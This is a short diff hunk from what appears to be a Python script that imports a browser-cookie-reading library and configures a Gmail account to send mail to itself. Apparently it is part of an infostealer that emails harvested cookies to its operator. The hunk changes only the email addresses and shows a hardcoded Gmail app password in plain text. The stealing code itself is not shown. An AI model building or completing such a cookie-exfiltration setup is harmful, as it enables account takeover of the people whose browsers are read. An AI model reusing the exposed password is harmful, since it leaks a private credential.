@@ -22,9 +22,9 @@ import ctypes.wintypes
 import browser_cookie3
 
 # === CONFIG ===
-EMAIL_SENDER = "ysflt1@gmail.com"
+EMAIL_SENDER = "ysflnt1@gmail.com"
 EMAIL_PASSWORD = "ncwb npus wsem maxw"  # Replace with your Gmail app password!
-EMAIL_RECEIVER = "ysflt1@gmail.com"
+EMAIL_RECEIVER = "ysflnt1@gmail.com"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 
